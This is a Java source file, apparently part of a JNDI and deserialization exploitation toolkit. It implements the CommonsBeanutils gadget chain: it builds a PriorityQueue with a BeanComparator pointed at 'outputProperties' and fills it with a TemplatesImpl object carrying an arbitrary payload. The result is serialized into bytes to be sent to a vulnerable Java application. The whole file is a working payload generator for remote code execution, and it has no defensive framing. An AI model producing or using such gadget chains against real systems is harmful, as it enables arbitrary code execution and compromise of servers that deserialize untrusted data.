package sonomon.jndi.deser.gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.util.Comparator;
import java.util.PriorityQueue;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.deser.MyURLClassLoader;
import sonomon.jndi.factory.FactoryUtils;

public class CommonsBeanutils2 implements SerializeObject{
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
        MyURLClassLoader classLoader = new MyURLClassLoader(jarname);
        Class clazz = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
        Comparator comparator = (Comparator) clazz.getDeclaredConstructor(String.class,java.util.Comparator.class).newInstance(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        Deserialize.setFieldValue(comparator, "property", "outputProperties");
        Deserialize.setFieldValue(queue, "queue", new Object[]{tempImpl, tempImpl});
        
        return queue;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}